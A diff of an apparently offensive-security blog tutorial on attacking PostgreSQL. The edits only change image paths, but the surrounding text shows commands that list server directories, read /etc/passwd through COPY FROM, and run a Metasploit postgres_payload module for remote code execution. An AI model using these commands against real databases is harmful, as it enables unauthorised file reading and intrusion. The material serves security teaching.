@@ -11,7 +11,7 @@ Manually PostgreSQL databases can interact with the underlying operating by allo
 ```
 postgres=# select pg_ls_dir('./');
 ```
-![](/assets/postgres_2.png)
+![](/blog/assets/postgres_2.png)
 
 It is also possible to create a database table in order to store and view contents of a file that exist in the host.
 ```
@@ -19,7 +19,7 @@ postgres-# CREATE TABLE temp(t TEXT);
 postgres-# COPY temp FROM '/etc/passwd';
 postgres-# SELECT * FROM temp limit 1 offset 0;
 ```
-![](/assets/postgres_3.png)
+![](/blog/assets/postgres_3.png)
 
 ## Remote Command Execution
 Similar to the MySQL UDF exploit we have in our arsenal, another Metasploit module for the win: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/postgres/postgres_payload.rb
@@ -30,7 +30,7 @@ Execution of arbitrary code is also possible if the postgres service account has
 ```
 msf > exploit/linux/postgres/postgres_payload
 ```
-![](/assets/postgres_4.png)
+![](/blog/assets/postgres_4.png)
 
 ## Conclusion
 You should now have the basic knowledge required for attacking a Postgres database!
